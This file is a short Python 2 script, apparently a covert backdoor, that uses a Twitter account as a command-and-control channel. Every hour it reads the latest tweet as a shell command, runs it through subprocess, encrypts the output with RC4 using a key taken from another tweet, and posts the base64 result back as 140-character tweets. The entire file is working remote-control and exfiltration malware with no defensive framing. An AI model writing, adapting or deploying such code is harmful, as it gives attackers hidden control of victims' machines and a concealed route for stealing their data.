from twitter import *
import os
from Crypto.Cipher import ARC4
import subprocess
import time

token = ''
token_key = ''
con_secret = ''
con_secret_key = ''
t = Twitter(auth=OAuth(token, token_key, con_secret, con_secret_key))

while 1:
	user = t.statuses.user_timeline()
	command = user[0]["text"].encode('utf-8')
	key = user[1]["text"].encode('hex')
	enc = ARC4.new(key)
	response = subprocess.check_output(command.split())

	enres = enc.encrypt(response).encode("base64")
	
	for i in xrange(0, len(enres), 140):
	        t.statuses.update(status=enres[i:i+140])
	time.sleep(3600)
